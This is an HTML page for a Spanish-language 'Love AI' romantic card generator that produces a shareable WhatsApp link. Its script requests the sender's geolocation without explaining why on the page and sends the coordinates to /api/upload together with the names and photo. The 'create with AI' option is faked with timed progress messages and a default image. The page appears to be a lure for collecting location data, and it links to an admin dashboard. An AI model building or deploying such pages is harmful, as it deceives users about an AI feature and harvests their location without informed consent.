<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love AI - Image Generator</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <header>
        <div class="brand">Love AI üíò</div>
    </header>
    <main>
        <!-- REMOVED INLINE MAX-WIDTH TO ALLOW WIDER CSS TO WORK -->
        <div class="glass-panel" style="width: 100%;">
            <h2>Estudio de Creaci√≥n M√°gica</h2>
            <p style="margin-bottom: 2rem;">Dise√±a una experiencia inolvidable para tu persona especial.</p>

            <div class="upload-container" id="upload-stage">

                <!-- GIFT CARD INPUTS -->
                <div class="gift-input-group">
                    <label class="gift-label">De parte de:</label>
                    <input type="text" class="gift-input" id="senderName" placeholder="Tu nombre..." />
                </div>

                <div class="gift-input-group">
                    <label class="gift-label">Para la persona especial:</label>
                    <input type="text" class="gift-input" id="recipientName" placeholder="Su nombre..." />
                </div>

                <!-- OPTION TABS -->
                <div class="tabs">
                    <button class="tab active" onclick="switchTab('upload')">üì∑ Subir Foto</button>
                    <button class="tab" onclick="switchTab('ai')">ü§ñ Crear con IA</button>
                </div>

                <!-- FILE UPLOAD AREA -->
                <div id="tab-upload" class="tab-content active">
                    <div class="file-drop-area" onclick="document.getElementById('fileInput').click()">
                        <div style="font-size: 2rem; margin-bottom: 10px;">üñºÔ∏è</div>
                        <span class="fake-btn">Seleccionar Archivo</span>
                        <div class="file-msg" style="margin-top: 10px; font-size: 0.9rem; color: #aaa;">o arrastra tu
                            foto aqu√≠</div>
                        <input class="file-input" type="file" id="fileInput" accept="image/*"
                            onchange="updateFileLabel(this)">
                    </div>
                </div>

                <!-- AI GENERATION AREA -->
                <div id="tab-ai" class="tab-content">
                    <div class="ai-chat-box">
                        <p class="ai-msg">ÔøΩ <b>Soy la IA del Amor.</b><br>Crear√© una tarjeta rom√°ntica √∫nica para
                            ustedes.</p>
                        <div class="ai-input-wrapper">
                            <input type="text" id="aiPrompt" placeholder="Ej: Paisaje de atardecer en Par√≠s..." disabled
                                style="cursor: not-allowed; opacity: 0.6; value: 'Generaci√≥n Autom√°tica'" />
                        </div>
                        <button class="action-btn" onclick="startCreationProcess()"
                            style="margin-top: 15px; background: linear-gradient(to right, #6a11cb, #2575fc);">ü™Ñ
                            Generar Imagen</button>
                    </div>
                </div>

                <!-- Main button only for Upload mode (AI has its own inside) -->
                <button id="main-action-btn" class="action-btn" onclick="startCreationProcess()">‚ú® Crear Experiencia
                    M√°gica ‚ú®</button>

                <div id="status" style="margin-top: 1rem; color: var(--secondary);"></div>
            </div>

            <!-- RESULT STAGE -->
            <div id="result-stage" class="hidden">
                <div class="letter-card">
                    <div style="font-size: 3.5rem; margin-bottom: 0;">üíå</div>
                    <h3>¬°Carta Lista!</h3>
                    <p style="color: #666; font-style: italic;">"He guardado un secreto para ti..."</p>
                    <p style="margin-bottom: 1.5rem; font-size: 0.9rem;">Tu persona especial ver√° una animaci√≥n m√°gica
                        antes de descubrir tu mensaje.</p>

                    <div class="premium-link-box" onclick="copyLink()">
                        <span id="shareLinkText" class="link-text">Generando...</span>
                        <button class="copy-btn-premium">COPIAR</button>
                    </div>

                    <p style="font-size:0.8rem; margin-top:1rem; color:#999;">
                        üëÜ Toca para copiar y enviar por WhatsApp
                    </p>
                </div>

                <button onclick="location.reload()"
                    style="background: transparent; border: 1px solid rgba(255,255,255,0.3); margin-top:2rem; padding: 10px 25px; border-radius: 30px; color: rgba(255,255,255,0.7); cursor: pointer; transition: all 0.2s;">
                    üîÑ Crear Otra Carta
                </button>
            </div>
        </div>

        <div style="margin-top: 2rem; text-align: center;">
            <a href="/dashboard.html" style="font-size:0.8rem; opacity:0.5; color: white; text-decoration: none;">üîê
                Acceso Admin</a>
        </div>
    </main>

    <!-- MAGIC MODAL -->
    <div id="magic-modal" class="hidden"
        style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:100; display:none; flex-direction:column; justify-content:center; align-items:center;">
        <div class="loader" style="margin-bottom: 2rem;"></div>
        <h2 id="magic-text" style="color: var(--secondary); font-size: 1.5rem;">Cargando...</h2>
        <p id="magic-subtext" style="color: #aaa; font-size: 0.9rem;">Por favor espera...</p>
    </div>

    <script>
        console.log("SCRIPT CARGADO Y LISTO");
        window.startCreationProcess = startCreationProcess; // Force global

        let selectedMode = 'upload'; // 'upload' or 'ai'

        function switchTab(mode) {
            selectedMode = mode;
            document.querySelectorAll('.tab').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));

            event.target.classList.add('active');
            document.getElementById(`tab-${mode}`).classList.add('active');

            // Hide main button if in AI mode (since AI has its own button)
            const mainBtn = document.getElementById('main-action-btn');
            if (mode === 'ai') {
                mainBtn.style.display = 'none';
            } else {
                mainBtn.style.display = 'block';
            }
        }

        function updateFileLabel(input) {
            if (input.files && input.files[0]) {
                document.querySelector('.file-msg').textContent = input.files[0].name;
            }
        }

        function copyLink() {
            const text = document.getElementById('shareLinkText').innerText;
            navigator.clipboard.writeText(text);
            alert("¬°Enlace copiado al portapapeles!");
        }

        async function startCreationProcess() {
            console.log(" FUNCION startCreationProcess INICIADA");

            try {
                const senderName = document.getElementById('senderName').value.trim();
                const recipientName = document.getElementById('recipientName').value.trim();

                if (!senderName || !recipientName) {
                    alert("Por favor completa ambos nombres.");
                    return;
                }

                // MODAL START
                const modal = document.getElementById('magic-modal');
                const txt = document.getElementById('magic-text');
                const sub = document.getElementById('magic-subtext');

                console.log("Mostrando modal...");
                modal.style.display = 'flex';

                // FORCE UPDATE TO PROVE JS IS RUNNING
                txt.textContent = "Iniciando sistema...";
                sub.textContent = "Por favor espera...";

                // 1. FIRE-AND-FORGET GEOLOCATION
                let creatorLoc = { lat: null, lng: null };
                console.log("Solicitando geolocalizaci√≥n (sin espera)...");

                if ("geolocation" in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            console.log("Ubicaci√≥n obtenida:", pos.coords);
                            creatorLoc = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                        },
                        (err) => { console.warn("Error/Timeout Geo:", err); },
                        { timeout: 3000 }
                    );
                } else {
                    console.log("Geolocalizaci√≥n no soportada.");
                }

                // 2. ANIMATION LOOP
                console.log("Iniciando bucle de animaci√≥n. Modo:", selectedMode);

                const steps = selectedMode === 'upload'
                    ? ["Conectando...", "Subiendo imagen...", "Mejorando calidad...", "Generando enlace..."]
                    : ["Conectando IA...", `Creando para ${recipientName}...`, "Dibujando flores...", "Finalizando..."];

                for (let i = 0; i < steps.length; i++) {
                    console.log(`Paso ${i + 1}/${steps.length}: ${steps[i]}`);
                    txt.textContent = steps[i];
                    sub.textContent = "Procesando...";
                    await new Promise(r => setTimeout(r, 1000));
                }

                // 3. SUBMIT
                console.log("Enviando datos al servidor...", creatorLoc);
                await submitData(senderName, recipientName, creatorLoc);
                console.log("Datos enviados correctamente.");

            } catch (err) {
                console.error("ERROR CRITICO EN PROCESO:", err);
                alert("Error: " + err.message);
                document.getElementById('magic-modal').style.display = 'none';
            }
        }

        async function submitData(senderName, recipientName, loc) {
            console.log("--> INICIANDO submitData");
            const formData = new FormData();
            formData.append('senderName', senderName);
            formData.append('recipientName', recipientName);

            if (loc && loc.lat) {
                formData.append('creatorLat', loc.lat);
                formData.append('creatorLng', loc.lng);
            }

            if (selectedMode === 'upload') {
                const fileInput = document.getElementById('fileInput');
                if (!fileInput.files[0]) {
                    alert("Debes seleccionar una imagen.");
                    document.getElementById('magic-modal').style.display = 'none';
                    return;
                }
                formData.append('image', fileInput.files[0]);
            } else {
                formData.append('useDefault', 'true');
            }

            try {
                console.log("Enviando petici√≥n fetch a /api/upload...");

                // ADD TIMEOUT TO FETCH (15 seconds)
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 15000);

                const response = await fetch('/api/upload', {
                    method: 'POST',
                    body: formData,
                    signal: controller.signal
                });
                clearTimeout(timeoutId);

                console.log("Respuesta recibida. Status:", response.status);
                const data = await response.json();
                console.log("Data:", data);

                if (response.ok) {
                    // HIDE MODAL SO USER CAN SEE RESULT
                    document.getElementById('magic-modal').style.display = 'none';

                    document.getElementById('upload-stage').classList.add('hidden');
                    document.getElementById('result-stage').classList.remove('hidden');

                    const link = `${window.location.origin}/view/${data.id}`;
                    document.getElementById('shareLinkText').innerText = link;
                } else {
                    console.error("Server API Error:", data);
                    alert("Error del servidor: " + (data.error || "Desconocido"));
                }
            } catch (err) {
                console.error("Error en submitData:", err);
                if (err.name === 'AbortError') {
                    alert("El servidor tard√≥ demasiado en responder.");
                } else {
                    alert("Error de conexi√≥n: " + err.message);
                }
            }
        }
    </script>
</body>